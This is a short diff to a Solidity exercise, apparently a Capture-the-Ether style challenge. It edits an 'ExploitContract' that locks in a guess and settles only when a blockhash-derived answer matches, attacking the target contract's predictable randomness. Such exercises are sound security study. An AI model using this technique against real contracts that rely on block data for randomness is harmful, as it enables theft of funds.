@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
-import "forge-std/console.sol";
+// import "forge-std/console.sol";
 
 contract PredictTheFuture {
     address guesser;
@@ -56,11 +56,12 @@ contract ExploitContract {
 
     // Write your exploit code below
     uint256 guessedAt;
-    uint8 constant guess = 0;
+    uint8 guess;
 
     receive() external payable {}
 
-    function guessNow() external payable {
+    function guessNow(uint8 guess_) external payable {
+        guess = guess_;
         predictTheFuture.lockInGuess{value: 1 ether}(guess);
         guessedAt = block.number;
     }
@@ -80,7 +81,7 @@ contract ExploitContract {
                 )
             )
         ) % 10;
-        console.log("tryToSettle()", answer);
+        // console.log("tryToSettle()", answer);
 
         if (answer == guess) {
             predictTheFuture.settle();
